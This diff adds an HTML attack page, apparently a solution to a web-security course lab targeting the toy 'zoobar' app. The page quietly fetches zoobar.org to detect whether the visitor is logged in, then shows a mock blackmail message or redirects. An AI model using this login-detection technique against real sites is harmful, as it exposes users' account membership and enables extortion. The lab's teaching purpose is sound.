@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Blah</title>
+  <link rel="stylesheet" href="http://zoobar.org:5000/bootstrap.min.css" type="text/css" charset="utf-8">
+  <script src="http://zoobar.org:5000/jquery.min.js" type="text/javascript" charset="utf-8"></script>
+</head>
+<body>
+  <div class="container">
+    <div class="row">
+      <div class="hero-unit span7 offset2" style="margin-top: 40px; text-align: center;">
+        <div id="blackmail">
+        </div>
+        <div id="dump" style="display:none;">
+        </div>
+      </div>
+    </div>
+  </div>
+  <script type="text/javascript" charset="utf-8">
+  function blackmailUser (data, status) {
+    var blackmail = document.getElementById('blackmail');
+    var dump = document.getElementById('dump');
+    dump.innerHTML = data;
+    if ($('.brand > img', dump).length) {
+      blackmail.innerHTML = "I'm blackmailing you. Follow my demands, or else the world will be told that you are a member of the Zoobar Foundation.";
+    } else {
+      window.location = 'http://zoobar.org:5000';
+    }
+  }
+  (function() {
+    $.ajax({
+      type: "GET",
+      url: "http://zoobar.org:5000/",
+      dataType: "html",
+      success: blackmailUser
+    });
+  })();
+  </script>
+</body>
+</html>
